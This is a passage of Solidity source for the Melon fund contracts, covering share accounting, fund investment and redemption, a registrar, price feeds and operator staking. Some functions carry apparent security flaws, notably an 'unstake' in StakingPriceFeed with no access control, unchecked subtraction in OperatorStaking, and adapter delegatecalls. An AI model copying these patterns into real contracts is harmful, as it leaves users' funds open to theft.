(uint);\n}\ncontract Shares is SharesInterface, Asset {\n bytes32 public name;\n bytes8 public symbol;\n uint public decimal;\n uint public creationTime;\n function Shares(bytes32 _name, bytes8 _symbol, uint _decimal, uint _creationTime) {\n name = _name;\n symbol = _symbol;\n decimal = _decimal;\n creationTime = _creationTime;\n }\n function transfer(address _to, uint _value)\n public\n returns (bool success)\n {\n require(balances[msg.sender] >= _value);\n require(balances[_to] + _value >= balances[_to]);\n balances[msg.sender] = sub(balances[msg.sender], _value);\n balances[_to] = add(balances[_to], _value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function getName() view returns (bytes32) { return name; }\n function getSymbol() view returns (bytes8) { return symbol; }\n function getDecimals() view returns (uint) { return decimal; }\n function getCreationTime() view returns (uint) { return creationTime; }\n function toSmallestShareUnit(uint quantity) view returns (uint) { return mul(quantity, 10 ** getDecimals()); }\n function toWholeShareUnit(uint quantity) view returns (uint) { return quantity / (10 ** getDecimals()); }\n function createShares(address recipient, uint shareQuantity) internal {\n _totalSupply = add(_totalSupply, shareQuantity);\n balances[recipient] = add(balances[recipient], shareQuantity);\n emit Created(msg.sender, now, shareQuantity);\n emit Transfer(address(0), recipient, shareQuantity);\n }\n function annihilateShares(address recipient, uint shareQuantity) internal {\n _totalSupply = sub(_totalSupply, shareQuantity);\n balances[recipient] = sub(balances[recipient], shareQuantity);\n emit Annihilated(msg.sender, now, shareQuantity);\n emit Transfer(recipient, address(0), shareQuantity);\n }\n}\ninterface CompetitionInterface {\n event Register(uint withId, address fund, address manager);\n event ClaimReward(address registrant, address fund, uint shares);\n function termsAndConditionsAreSigned(address byManager, uint8 v, bytes32 r, bytes32 s) view returns (bool);\n function isWhitelisted(address x) view returns (bool);\n function isCompetitionActive() view returns (bool);\n function getMelonAsset() view returns (address);\n function getRegistrantId(address x) view returns (uint);\n function getRegistrantFund(address x) view returns (address);\n function getCompetitionStatusOfRegistrants() view returns (address[], address[], bool[]);\n function getTimeTillEnd() view returns (uint);\n function getEtherValue(uint amount) view returns (uint);\n function calculatePayout(uint payin) view returns (uint);\n function registerForCompetition(address fund, uint8 v, bytes32 r, bytes32 s) payable;\n function batchAddToWhitelist(uint maxBuyinQuantity, address[] whitelistants);\n function withdrawMln(address to, uint amount);\n function claimReward();\n}\ninterface ComplianceInterface {\n function isInvestmentPermitted(\n address ofParticipant,\n uint256 giveQuantity,\n uint256 shareQuantity\n ) view returns (bool);\n function isRedemptionPermitted(\n address ofParticipant,\n uint256 shareQuantity,\n uint256 receiveQuantity\n ) view returns (bool);\n}\ncontract DBC {\n modifier pre_cond(bool condition) {\n require(condition);\n _;\n }\n modifier post_cond(bool condition) {\n _;\n assert(condition);\n }\n modifier invariant(bool condition) {\n require(condition);\n _;\n assert(condition);\n }\n}\ncontract Owned is DBC {\n address public owner;\n function Owned() { owner = msg.sender; }\n function changeOwner(address ofNewOwner) pre_cond(isOwner()) { owner = ofNewOwner; }\n function isOwner() internal returns (bool) { return msg.sender == owner; }\n}\ncontract Fund is DSMath, DBC, Owned, Shares, FundInterface {\n event OrderUpdated(address exchange, bytes32 orderId, UpdateType updateType);\n struct Modules {\n CanonicalPriceFeed pricefeed;\n ComplianceInterface compliance;\n RiskMgmtInterface riskmgmt;\n }\n struct Calculations {\n uint gav;\n uint managementFee;\n uint performanceFee;\n uint unclaimedFees;\n uint nav;\n uint highWaterMark;\n uint totalSupply;\n uint timestamp;\n }\n enum UpdateType { make, take, cancel }\n enum RequestStatus { active, cancelled, executed }\n struct Request {\n address participant;\n RequestStatus status;\n address requestAsset;\n uint shareQuantity;\n uint giveQuantity;\n uint receiveQuantity;\n uint timestamp;\n uint atUpdateId;\n }\n struct Exchange {\n address exchange;\n address exchangeAdapter;\n bool takesCustody;\n }\n struct OpenMakeOrder {\n uint id;\n uint expiresAt;\n }\n struct Order {\n address exchangeAddress;\n bytes32 orderId;\n UpdateType updateType;\n address makerAsset;\n address takerAsset;\n uint makerQuantity;\n uint takerQuantity;\n uint timestamp;\n uint fillTakerQuantity;\n }\n uint public constant MAX_FUND_ASSETS = 20;\n uint public constant ORDER_EXPIRATION_TIME = 86400;\n uint public MANAGEMENT_FEE_RATE;\n uint public PERFORMANCE_FEE_RATE;\n address public VERSION;\n Asset public QUOTE_ASSET;\n Modules public modules;\n Exchange[] public exchanges;\n Calculations public atLastUnclaimedFeeAllocation;\n Order[] public orders;\n mapping (address => mapping(address => OpenMakeOrder)) public exchangesToOpenMakeOrders;\n bool public isShutDown;\n Request[] public requests;\n mapping (address => bool) public isInvestAllowed;\n address[] public ownedAssets;\n mapping (address => bool) public isInAssetList;\n mapping (address => bool) public isInOpenMakeOrder;\n function Fund(\n address ofManager,\n bytes32 withName,\n address ofQuoteAsset,\n uint ofManagementFee,\n uint ofPerformanceFee,\n address ofCompliance,\n address ofRiskMgmt,\n address ofPriceFeed,\n address[] ofExchanges,\n address[] ofDefaultAssets\n )\n Shares(withName, \"MLNF\", 18, now)\n {\n require(ofManagementFee < 10 ** 18);\n require(ofPerformanceFee < 10 ** 18);\n isInvestAllowed[ofQuoteAsset] = true;\n owner = ofManager;\n MANAGEMENT_FEE_RATE = ofManagementFee;\n PERFORMANCE_FEE_RATE = ofPerformanceFee;\n VERSION = msg.sender;\n modules.compliance = ComplianceInterface(ofCompliance);\n modules.riskmgmt = RiskMgmtInterface(ofRiskMgmt);\n modules.pricefeed = CanonicalPriceFeed(ofPriceFeed);\n for (uint i = 0; i < ofExchanges.length; ++i) {\n require(modules.pricefeed.exchangeIsRegistered(ofExchanges[i]));\n var (ofExchangeAdapter, takesCustody, ) = modules.pricefeed.getExchangeInformation(ofExchanges[i]);\n exchanges.push(Exchange({\n exchange: ofExchanges[i],\n exchangeAdapter: ofExchangeAdapter,\n takesCustody: takesCustody\n }));\n }\n QUOTE_ASSET = Asset(ofQuoteAsset);\n ownedAssets.push(ofQuoteAsset);\n isInAssetList[ofQuoteAsset] = true;\n require(address(QUOTE_ASSET) == modules.pricefeed.getQuoteAsset());\n for (uint j = 0; j < ofDefaultAssets.length; j++) {\n require(modules.pricefeed.assetIsRegistered(ofDefaultAssets[j]));\n isInvestAllowed[ofDefaultAssets[j]] = true;\n }\n atLastUnclaimedFeeAllocation = Calculations({\n gav: 0,\n managementFee: 0,\n performanceFee: 0,\n unclaimedFees: 0,\n nav: 0,\n highWaterMark: 10 ** getDecimals(),\n totalSupply: _totalSupply,\n timestamp: now\n });\n }\n function enableInvestment(address[] ofAssets)\n external\n pre_cond(isOwner())\n {\n for (uint i = 0; i < ofAssets.length; ++i) {\n require(modules.pricefeed.assetIsRegistered(ofAssets[i]));\n isInvestAllowed[ofAssets[i]] = true;\n }\n }\n function disableInvestment(address[] ofAssets)\n external\n pre_cond(isOwner())\n {\n for (uint i = 0; i < ofAssets.length; ++i) {\n isInvestAllowed[ofAssets[i]] = false;\n }\n }\n function shutDown() external pre_cond(msg.sender == VERSION) { isShutDown = true; }\n function requestInvestment(\n uint giveQuantity,\n uint shareQuantity,\n address investmentAsset\n )\n external\n pre_cond(!isShutDown)\n pre_cond(isInvestAllowed[investmentAsset])\n pre_cond(modules.compliance.isInvestmentPermitted(msg.sender, giveQuantity, shareQuantity))\n {\n requests.push(Request({\n participant: msg.sender,\n status: RequestStatus.active,\n requestAsset: investmentAsset,\n shareQuantity: shareQuantity,\n giveQuantity: giveQuantity,\n receiveQuantity: shareQuantity,\n timestamp: now,\n atUpdateId: modules.pricefeed.getLastUpdateId()\n }));\n emit RequestUpdated(getLastRequestId());\n }\n function executeRequest(uint id)\n external\n pre_cond(!isShutDown)\n pre_cond(requests[id].status == RequestStatus.active)\n pre_cond(\n _totalSupply == 0 ||\n (\n now >= add(requests[id].timestamp, modules.pricefeed.getInterval()) &&\n modules.pricefeed.getLastUpdateId() >= add(requests[id].atUpdateId, 2)\n )\n )\n {\n Request request = requests[id];\n var (isRecent, , ) =\n modules.pricefeed.getPriceInfo(address(request.requestAsset));\n require(isRecent);\n uint costQuantity = toWholeShareUnit(mul(request.shareQuantity, calcSharePriceAndAllocateFees()));\n if (request.requestAsset != address(QUOTE_ASSET)) {\n var (isPriceRecent, invertedRequestAssetPrice, requestAssetDecimal) = modules.pricefeed.getInvertedPriceInfo(request.requestAsset);\n if (!isPriceRecent) {\n revert();\n }\n costQuantity = mul(costQuantity, invertedRequestAssetPrice) / 10 ** requestAssetDecimal;\n }\n if (\n isInvestAllowed[request.requestAsset] &&\n costQuantity <= request.giveQuantity\n ) {\n request.status = RequestStatus.executed;\n require(AssetInterface(request.requestAsset).transferFrom(request.participant, address(this), costQuantity));\n createShares(request.participant, request.shareQuantity);\n if (!isInAssetList[request.requestAsset]) {\n ownedAssets.push(request.requestAsset);\n isInAssetList[request.requestAsset] = true;\n }\n } else {\n revert();\n }\n }\n function cancelRequest(uint id)\n external\n pre_cond(requests[id].status == RequestStatus.active)\n pre_cond(requests[id].participant == msg.sender || isShutDown)\n {\n requests[id].status = RequestStatus.cancelled;\n }\n function redeemAllOwnedAssets(uint shareQuantity)\n external\n returns (bool success)\n {\n return emergencyRedeem(shareQuantity, ownedAssets);\n }\n function callOnExchange(\n uint exchangeIndex,\n bytes4 method,\n address[5] orderAddresses,\n uint[8] orderValues,\n bytes32 identifier,\n uint8 v,\n bytes32 r,\n bytes32 s\n )\n external\n {\n require(modules.pricefeed.exchangeMethodIsAllowed(\n exchanges[exchangeIndex].exchange, method\n ));\n require((exchanges[exchangeIndex].exchangeAdapter).delegatecall(\n method, exchanges[exchangeIndex].exchange,\n orderAddresses, orderValues, identifier, v, r, s\n ));\n }\n function addOpenMakeOrder(\n address ofExchange,\n address ofSellAsset,\n uint orderId\n )\n pre_cond(msg.sender == address(this))\n {\n isInOpenMakeOrder[ofSellAsset] = true;\n exchangesToOpenMakeOrders[ofExchange][ofSellAsset].id = orderId;\n exchangesToOpenMakeOrders[ofExchange][ofSellAsset].expiresAt = add(now, ORDER_EXPIRATION_TIME);\n }\n function removeOpenMakeOrder(\n address ofExchange,\n address ofSellAsset\n )\n pre_cond(msg.sender == address(this))\n {\n delete exchangesToOpenMakeOrders[ofExchange][ofSellAsset];\n }\n function orderUpdateHook(\n address ofExchange,\n bytes32 orderId,\n UpdateType updateType,\n address[2] orderAddresses,\n uint[3] orderValues\n )\n pre_cond(msg.sender == address(this))\n {\n if (updateType == UpdateType.make || updateType == UpdateType.take) {\n orders.push(Order({\n exchangeAddress: ofExchange,\n orderId: orderId,\n updateType: updateType,\n makerAsset: orderAddresses[0],\n takerAsset: orderAddresses[1],\n makerQuantity: orderValues[0],\n takerQuantity: orderValues[1],\n timestamp: block.timestamp,\n fillTakerQuantity: orderValues[2]\n }));\n }\n emit OrderUpdated(ofExchange, orderId, updateType);\n }\n function calcGav() returns (uint gav) {\n uint[] memory allAssetHoldings = new uint[](ownedAssets.length);\n uint[] memory allAssetPrices = new uint[](ownedAssets.length);\n address[] memory tempOwnedAssets;\n tempOwnedAssets = ownedAssets;\n delete ownedAssets;\n for (uint i = 0; i < tempOwnedAssets.length; ++i) {\n address ofAsset = tempOwnedAssets[i];\n uint assetHoldings = add(\n uint(AssetInterface(ofAsset).balanceOf(address(this))),\n quantityHeldInCustodyOfExchange(ofAsset)\n );\n var (isRecent, assetPrice, assetDecimals) = modules.pricefeed.getPriceInfo(ofAsset);\n if (!isRecent) {\n revert();\n }\n allAssetHoldings[i] = assetHoldings;\n allAssetPrices[i] = assetPrice;\n gav = add(gav, mul(assetHoldings, assetPrice) / (10 ** uint256(assetDecimals)));\n if (assetHoldings != 0 || ofAsset == address(QUOTE_ASSET) || isInOpenMakeOrder[ofAsset]) {\n ownedAssets.push(ofAsset);\n } else {\n isInAssetList[ofAsset] = false;\n }\n }\n emit PortfolioContent(tempOwnedAssets, allAssetHoldings, allAssetPrices);\n }\n function addAssetToOwnedAssets (address ofAsset)\n public\n pre_cond(isOwner() || msg.sender == address(this))\n {\n isInOpenMakeOrder[ofAsset] = true;\n if (!isInAssetList[ofAsset]) {\n ownedAssets.push(ofAsset);\n isInAssetList[ofAsset] = true;\n }\n }\n function calcUnclaimedFees(uint gav)\n view\n returns (\n uint managementFee,\n uint performanceFee,\n uint unclaimedFees)\n {\n uint timePassed = sub(now, atLastUnclaimedFeeAllocation.timestamp);\n uint gavPercentage = mul(timePassed, gav) / (1 years);\n managementFee = wmul(gavPercentage, MANAGEMENT_FEE_RATE);\n uint valuePerShareExclMgmtFees = _totalSupply > 0 ? calcValuePerShare(sub(gav, managementFee), _totalSupply) : toSmallestShareUnit(1);\n if (valuePerShareExclMgmtFees > atLastUnclaimedFeeAllocation.highWaterMark) {\n uint gainInSharePrice = sub(valuePerShareExclMgmtFees, atLastUnclaimedFeeAllocation.highWaterMark);\n uint investmentProfits = wmul(gainInSharePrice, _totalSupply);\n performanceFee = wmul(investmentProfits, PERFORMANCE_FEE_RATE);\n }\n unclaimedFees = add(managementFee, performanceFee);\n }\n function calcNav(uint gav, uint unclaimedFees)\n view\n returns (uint nav)\n {\n nav = sub(gav, unclaimedFees);\n }\n function calcValuePerShare(uint totalValue, uint numShares)\n view\n pre_cond(numShares > 0)\n returns (uint valuePerShare)\n {\n valuePerShare = toSmallestShareUnit(totalValue) / numShares;\n }\n function performCalculations()\n view\n returns (\n uint gav,\n uint managementFee,\n uint performanceFee,\n uint unclaimedFees,\n uint feesShareQuantity,\n uint nav,\n uint sharePrice\n )\n {\n gav = calcGav();\n (managementFee, performanceFee, unclaimedFees) = calcUnclaimedFees(gav);\n nav = calcNav(gav, unclaimedFees);\n feesShareQuantity = (gav == 0) ? 0 : mul(_totalSupply, unclaimedFees) / gav;\n uint totalSupplyAccountingForFees = add(_totalSupply, feesShareQuantity);\n sharePrice = _totalSupply > 0 ? calcValuePerShare(gav, totalSupplyAccountingForFees) : toSmallestShareUnit(1);\n }\n function calcSharePriceAndAllocateFees() public returns (uint)\n {\n var (\n gav,\n managementFee,\n performanceFee,\n unclaimedFees,\n feesShareQuantity,\n nav,\n sharePrice\n ) = performCalculations();\n createShares(owner, feesShareQuantity);\n uint highWaterMark = atLastUnclaimedFeeAllocation.highWaterMark >= sharePrice ? atLastUnclaimedFeeAllocation.highWaterMark : sharePrice;\n atLastUnclaimedFeeAllocation = Calculations({\n gav: gav,\n managementFee: managementFee,\n performanceFee: performanceFee,\n unclaimedFees: unclaimedFees,\n nav: nav,\n highWaterMark: highWaterMark,\n totalSupply: _totalSupply,\n timestamp: now\n });\n emit FeesConverted(now, feesShareQuantity, unclaimedFees);\n emit CalculationUpdate(now, managementFee, performanceFee, nav, sharePrice, _totalSupply);\n return sharePrice;\n }\n function emergencyRedeem(uint shareQuantity, address[] requestedAssets)\n public\n pre_cond(balances[msg.sender] >= shareQuantity)\n returns (bool)\n {\n address ofAsset;\n uint[] memory ownershipQuantities = new uint[](requestedAssets.length);\n address[] memory redeemedAssets = new address[](requestedAssets.length);\n for (uint i = 0; i < requestedAssets.length; ++i) {\n ofAsset = requestedAssets[i];\n require(isInAssetList[ofAsset]);\n for (uint j = 0; j < redeemedAssets.length; j++) {\n if (ofAsset == redeemedAssets[j]) {\n revert();\n }\n }\n redeemedAssets[i] = ofAsset;\n uint assetHoldings = add(\n uint(AssetInterface(ofAsset).balanceOf(address(this))),\n quantityHeldInCustodyOfExchange(ofAsset)\n );\n if (assetHoldings == 0) continue;\n ownershipQuantities[i] = mul(assetHoldings, shareQuantity) / _totalSupply;\n if (uint(AssetInterface(ofAsset).balanceOf(address(this))) < ownershipQuantities[i]) {\n isShutDown = true;\n emit ErrorMessage(\"CRITICAL ERR: Not enough assetHoldings for owed ownershipQuantitiy\");\n return false;\n }\n }\n annihilateShares(msg.sender, shareQuantity);\n for (uint k = 0; k < requestedAssets.length; ++k) {\n ofAsset = requestedAssets[k];\n if (ownershipQuantities[k] == 0) {\n continue;\n } else if (!AssetInterface(ofAsset).transfer(msg.sender, ownershipQuantities[k])) {\n revert();\n }\n }\n emit Redeemed(msg.sender, now, shareQuantity);\n return true;\n }\n function quantityHeldInCustodyOfExchange(address ofAsset) returns (uint) {\n uint totalSellQuantity;\n uint totalSellQuantityInApprove;\n for (uint i; i < exchanges.length; i++) {\n if (exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset].id == 0) {\n continue;\n }\n var (sellAsset, , sellQuantity, ) = GenericExchangeInterface(exchanges[i].exchangeAdapter).getOrder(exchanges[i].exchange, exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset].id);\n if (sellQuantity == 0) {\n delete exchangesToOpenMakeOrders[exchanges[i].exchange][ofAsset];\n }\n totalSellQuantity = add(totalSellQuantity, sellQuantity);\n if (!exchanges[i].takesCustody) {\n totalSellQuantityInApprove += sellQuantity;\n }\n }\n if (totalSellQuantity == 0) {\n isInOpenMakeOrder[sellAsset] = false;\n }\n return sub(totalSellQuantity, totalSellQuantityInApprove);\n }\n function calcSharePrice() view returns (uint sharePrice) {\n (, , , , , sharePrice) = performCalculations();\n return sharePrice;\n }\n function getModules() view returns (address, address, address) {\n return (\n address(modules.pricefeed),\n address(modules.compliance),\n address(modules.riskmgmt)\n );\n }\n function getLastRequestId() view returns (uint) { return requests.length - 1; }\n function getLastOrderIndex() view returns (uint) { return orders.length - 1; }\n function getManager() view returns (address) { return owner; }\n function getOwnedAssetsLength() view returns (uint) { return ownedAssets.length; }\n function getExchangeInfo() view returns (address[], address[], bool[]) {\n address[] memory ofExchanges = new address[](exchanges.length);\n address[] memory ofAdapters = new address[](exchanges.length);\n bool[] memory takesCustody = new bool[](exchanges.length);\n for (uint i = 0; i < exchanges.length; i++) {\n ofExchanges[i] = exchanges[i].exchange;\n ofAdapters[i] = exchanges[i].exchangeAdapter;\n takesCustody[i] = exchanges[i].takesCustody;\n }\n return (ofExchanges, ofAdapters, takesCustody);\n }\n function orderExpired(address ofExchange, address ofAsset) view returns (bool) {\n uint expiryTime = exchangesToOpenMakeOrders[ofExchange][ofAsset].expiresAt;\n require(expiryTime > 0);\n return block.timestamp >= expiryTime;\n }\n function getOpenOrderInfo(address ofExchange, address ofAsset) view returns (uint, uint) {\n OpenMakeOrder order = exchangesToOpenMakeOrders[ofExchange][ofAsset];\n return (order.id, order.expiresAt);\n }\n}\ncontract CompetitionCompliance is ComplianceInterface, DBC, Owned {\n address public competitionAddress;\n function CompetitionCompliance(address ofCompetition) public {\n competitionAddress = ofCompetition;\n }\n function isInvestmentPermitted(\n address ofParticipant,\n uint256 giveQuantity,\n uint256 shareQuantity\n )\n view\n returns (bool)\n {\n return competitionAddress == ofParticipant;\n }\n function isRedemptionPermitted(\n address ofParticipant,\n uint256 shareQuantity,\n uint256 receiveQuantity\n )\n view\n returns (bool)\n {\n return competitionAddress == ofParticipant;\n }\n function isCompetitionAllowed(\n address x\n )\n view\n returns (bool)\n {\n return CompetitionInterface(competitionAddress).isWhitelisted(x) && CompetitionInterface(competitionAddress).isCompetitionActive();\n }\n function changeCompetitionAddress(\n address ofCompetition\n )\n pre_cond(isOwner())\n {\n competitionAddress = ofCompetition;\n }\n}\ninterface GenericExchangeInterface {\n event OrderUpdated(uint id);\n function makeOrder(\n address onExchange,\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n ) external returns (uint);\n function takeOrder(address onExchange, uint id, uint quantity) external returns (bool);\n function cancelOrder(address onExchange, uint id) external returns (bool);\n function isApproveOnly() view returns (bool);\n function getLastOrderId(address onExchange) view returns (uint);\n function isActive(address onExchange, uint id) view returns (bool);\n function getOwner(address onExchange, uint id) view returns (address);\n function getOrder(address onExchange, uint id) view returns (address, address, uint, uint);\n function getTimestamp(address onExchange, uint id) view returns (uint);\n}\ncontract CanonicalRegistrar is DSThing, DBC {\n struct Asset {\n bool exists;\n bytes32 name;\n bytes8 symbol;\n uint decimals;\n string url;\n string ipfsHash;\n address breakIn;\n address breakOut;\n uint[] standards;\n bytes4[] functionSignatures;\n uint price;\n uint timestamp;\n }\n struct Exchange {\n bool exists;\n address adapter;\n bool takesCustody;\n bytes4[] functionSignatures;\n }\n mapping (address => Asset) public assetInformation;\n address[] public registeredAssets;\n mapping (address => Exchange) public exchangeInformation;\n address[] public registeredExchanges;\n function registerAsset(\n address ofAsset,\n bytes32 inputName,\n bytes8 inputSymbol,\n uint inputDecimals,\n string inputUrl,\n string inputIpfsHash,\n address[2] breakInBreakOut,\n uint[] inputStandards,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(!assetInformation[ofAsset].exists)\n {\n assetInformation[ofAsset].exists = true;\n registeredAssets.push(ofAsset);\n updateAsset(\n ofAsset,\n inputName,\n inputSymbol,\n inputDecimals,\n inputUrl,\n inputIpfsHash,\n breakInBreakOut,\n inputStandards,\n inputFunctionSignatures\n );\n assert(assetInformation[ofAsset].exists);\n }\n function registerExchange(\n address ofExchange,\n address ofExchangeAdapter,\n bool inputTakesCustody,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(!exchangeInformation[ofExchange].exists)\n {\n exchangeInformation[ofExchange].exists = true;\n registeredExchanges.push(ofExchange);\n updateExchange(\n ofExchange,\n ofExchangeAdapter,\n inputTakesCustody,\n inputFunctionSignatures\n );\n assert(exchangeInformation[ofExchange].exists);\n }\n function updateAsset(\n address ofAsset,\n bytes32 inputName,\n bytes8 inputSymbol,\n uint inputDecimals,\n string inputUrl,\n string inputIpfsHash,\n address[2] ofBreakInBreakOut,\n uint[] inputStandards,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(assetInformation[ofAsset].exists)\n {\n Asset asset = assetInformation[ofAsset];\n asset.name = inputName;\n asset.symbol = inputSymbol;\n asset.decimals = inputDecimals;\n asset.url = inputUrl;\n asset.ipfsHash = inputIpfsHash;\n asset.breakIn = ofBreakInBreakOut[0];\n asset.breakOut = ofBreakInBreakOut[1];\n asset.standards = inputStandards;\n asset.functionSignatures = inputFunctionSignatures;\n }\n function updateExchange(\n address ofExchange,\n address ofExchangeAdapter,\n bool inputTakesCustody,\n bytes4[] inputFunctionSignatures\n )\n auth\n pre_cond(exchangeInformation[ofExchange].exists)\n {\n Exchange exchange = exchangeInformation[ofExchange];\n exchange.adapter = ofExchangeAdapter;\n exchange.takesCustody = inputTakesCustody;\n exchange.functionSignatures = inputFunctionSignatures;\n }\n function removeAsset(\n address ofAsset,\n uint assetIndex\n )\n auth\n pre_cond(assetInformation[ofAsset].exists)\n {\n require(registeredAssets[assetIndex] == ofAsset);\n delete assetInformation[ofAsset];\n delete registeredAssets[assetIndex];\n for (uint i = assetIndex; i < registeredAssets.length-1; i++) {\n registeredAssets[i] = registeredAssets[i+1];\n }\n registeredAssets.length--;\n assert(!assetInformation[ofAsset].exists);\n }\n function removeExchange(\n address ofExchange,\n uint exchangeIndex\n )\n auth\n pre_cond(exchangeInformation[ofExchange].exists)\n {\n require(registeredExchanges[exchangeIndex] == ofExchange);\n delete exchangeInformation[ofExchange];\n delete registeredExchanges[exchangeIndex];\n for (uint i = exchangeIndex; i < registeredExchanges.length-1; i++) {\n registeredExchanges[i] = registeredExchanges[i+1];\n }\n registeredExchanges.length--;\n assert(!exchangeInformation[ofExchange].exists);\n }\n function getName(address ofAsset) view returns (bytes32) { return assetInformation[ofAsset].name; }\n function getSymbol(address ofAsset) view returns (bytes8) { return assetInformation[ofAsset].symbol; }\n function getDecimals(address ofAsset) view returns (uint) { return assetInformation[ofAsset].decimals; }\n function assetIsRegistered(address ofAsset) view returns (bool) { return assetInformation[ofAsset].exists; }\n function getRegisteredAssets() view returns (address[]) { return registeredAssets; }\n function assetMethodIsAllowed(\n address ofAsset, bytes4 querySignature\n )\n returns (bool)\n {\n bytes4[] memory signatures = assetInformation[ofAsset].functionSignatures;\n for (uint i = 0; i < signatures.length; i++) {\n if (signatures[i] == querySignature) {\n return true;\n }\n }\n return false;\n }\n function exchangeIsRegistered(address ofExchange) view returns (bool) { return exchangeInformation[ofExchange].exists; }\n function getRegisteredExchanges() view returns (address[]) { return registeredExchanges; }\n function getExchangeInformation(address ofExchange)\n view\n returns (address, bool)\n {\n Exchange exchange = exchangeInformation[ofExchange];\n return (\n exchange.adapter,\n exchange.takesCustody\n );\n }\n function getExchangeFunctionSignatures(address ofExchange)\n view\n returns (bytes4[])\n {\n return exchangeInformation[ofExchange].functionSignatures;\n }\n function exchangeMethodIsAllowed(\n address ofExchange, bytes4 querySignature\n )\n returns (bool)\n {\n bytes4[] memory signatures = exchangeInformation[ofExchange].functionSignatures;\n for (uint i = 0; i < signatures.length; i++) {\n if (signatures[i] == querySignature) {\n return true;\n }\n }\n return false;\n }\n}\ninterface SimplePriceFeedInterface {\n event PriceUpdated(bytes32 hash);\n function update(address[] ofAssets, uint[] newPrices) external;\n function getQuoteAsset() view returns (address);\n function getLastUpdateId() view returns (uint);\n function getPrice(address ofAsset) view returns (uint price, uint timestamp);\n function getPrices(address[] ofAssets) view returns (uint[] prices, uint[] timestamps);\n}\ncontract SimplePriceFeed is SimplePriceFeedInterface, DSThing, DBC {\n struct Data {\n uint price;\n uint timestamp;\n }\n mapping(address => Data) public assetsToPrices;\n address public QUOTE_ASSET;\n uint public updateId;\n CanonicalRegistrar public registrar;\n CanonicalPriceFeed public superFeed;\n function SimplePriceFeed(\n address ofRegistrar,\n address ofQuoteAsset,\n address ofSuperFeed\n ) {\n registrar = CanonicalRegistrar(ofRegistrar);\n QUOTE_ASSET = ofQuoteAsset;\n superFeed = CanonicalPriceFeed(ofSuperFeed);\n }\n function update(address[] ofAssets, uint[] newPrices)\n external\n auth\n {\n _updatePrices(ofAssets, newPrices);\n }\n function getQuoteAsset() view returns (address) { return QUOTE_ASSET; }\n function getLastUpdateId() view returns (uint) { return updateId; }\n function getPrice(address ofAsset)\n view\n returns (uint price, uint timestamp)\n {\n Data data = assetsToPrices[ofAsset];\n return (data.price, data.timestamp);\n }\n function getPrices(address[] ofAssets)\n view\n returns (uint[], uint[])\n {\n uint[] memory prices = new uint[](ofAssets.length);\n uint[] memory timestamps = new uint[](ofAssets.length);\n for (uint i; i < ofAssets.length; i++) {\n var (price, timestamp) = getPrice(ofAssets[i]);\n prices[i] = price;\n timestamps[i] = timestamp;\n }\n return (prices, timestamps);\n }\n function _updatePrices(address[] ofAssets, uint[] newPrices)\n internal\n pre_cond(ofAssets.length == newPrices.length)\n {\n updateId++;\n for (uint i = 0; i < ofAssets.length; ++i) {\n require(registrar.assetIsRegistered(ofAssets[i]));\n require(assetsToPrices[ofAssets[i]].timestamp != now);\n assetsToPrices[ofAssets[i]].timestamp = now;\n assetsToPrices[ofAssets[i]].price = newPrices[i];\n }\n emit PriceUpdated(keccak256(ofAssets, newPrices));\n }\n}\ncontract StakingPriceFeed is SimplePriceFeed {\n OperatorStaking public stakingContract;\n AssetInterface public stakingToken;\n function StakingPriceFeed(\n address ofRegistrar,\n address ofQuoteAsset,\n address ofSuperFeed\n )\n SimplePriceFeed(ofRegistrar, ofQuoteAsset, ofSuperFeed)\n {\n stakingContract = OperatorStaking(ofSuperFeed);\n stakingToken = AssetInterface(stakingContract.stakingToken());\n }\n function depositStake(uint amount, bytes data)\n external\n auth\n {\n require(stakingToken.transferFrom(msg.sender, address(this), amount));\n require(stakingToken.approve(stakingContract, amount));\n stakingContract.stake(amount, data);\n }\n function unstake(uint amount, bytes data) {\n stakingContract.unstake(amount, data);\n }\n function withdrawStake()\n external\n auth\n {\n uint amountToWithdraw = stakingContract.stakeToWithdraw(address(this));\n stakingContract.withdrawStake();\n require(stakingToken.transfer(msg.sender, amountToWithdraw));\n }\n}\ninterface RiskMgmtInterface {\n function isMakePermitted(\n uint orderPrice,\n uint referencePrice,\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n ) view returns (bool);\n function isTakePermitted(\n uint orderPrice,\n uint referencePrice,\n address sellAsset,\n address buyAsset,\n uint sellQuantity,\n uint buyQuantity\n ) view returns (bool);\n}\ncontract OperatorStaking is DBC {\n event Staked(address indexed user, uint256 amount, uint256 total, bytes data);\n event Unstaked(address indexed user, uint256 amount, uint256 total, bytes data);\n event StakeBurned(address indexed user, uint256 amount, bytes data);\n struct StakeData {\n uint amount;\n address staker;\n }\n struct Node {\n StakeData data;\n uint prev;\n uint next;\n }\n Node[] internal stakeNodes;\n uint public minimumStake;\n uint public numOperators;\n uint public withdrawalDelay;\n mapping (address => bool) public isRanked;\n mapping (address => uint) public latestUnstakeTime;\n mapping (address => uint) public stakeToWithdraw;\n mapping (address => uint) public stakedAmounts;\n uint public numStakers;\n AssetInterface public stakingToken;\n function OperatorStaking(\n AssetInterface _stakingToken,\n uint _minimumStake,\n uint _numOperators,\n uint _withdrawalDelay\n )\n public\n {\n require(address(_stakingToken) != address(0));\n stakingToken = _stakingToken;\n minimumStake = _minimumStake;\n numOperators = _numOperators;\n withdrawalDelay = _withdrawalDelay;\n StakeData memory temp = StakeData({ amount: 0, staker: address(0) });\n stakeNodes.push(Node(temp, 0, 0));\n }\n function stake(\n uint amount,\n bytes data\n )\n public\n pre_cond(amount >= minimumStake)\n {\n uint tailNodeId = stakeNodes[0].prev;\n stakedAmounts[msg.sender] += amount;\n updateStakerRanking(msg.sender);\n require(stakingToken.transferFrom(msg.sender, address(this), amount));\n }\n function unstake(\n uint amount,\n bytes data\n )\n public\n {\n uint preStake = stakedAmounts[msg.sender];\n uint postStake = preStake - amount;\n require(postStake >= minimumStake || postStake == 0);\n require(stakedAmounts[msg.sender] >= amount);\n latestUnstakeTime[msg.sender] = block.timestamp;\n stakedAmounts[msg.sender] -= amount;\n stakeToWithdraw[msg.sender] += amount;\n updateStakerRanking(msg.sender);\n emit Unstaked(msg.sender, amount, stakedAmounts[msg.sender], data);\n }\n function withdrawStake()\n public\n 